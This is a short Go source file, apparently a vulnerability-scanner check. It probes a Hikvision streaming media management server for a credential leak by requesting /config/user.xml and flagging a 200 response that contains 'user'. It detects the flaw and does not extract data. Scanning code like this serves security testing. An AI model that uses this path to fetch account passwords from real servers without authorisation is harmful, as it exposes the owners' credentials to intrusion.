package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//HIKVISION 流媒体管理服务器 user.xml 账号密码泄漏漏洞

func Userxml(u string) bool {
	if req, err := pkg.HttpRequset(u+"/config/user.xml", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "user") {
			pkg.GoPocLog(fmt.Sprintf("Found vulnHIKVISION 流媒体管理服务器 user.xml 账号密码泄漏漏洞 |%s\n", u+"/config/user.xml"))
			return true
		}
	}
	return false
}
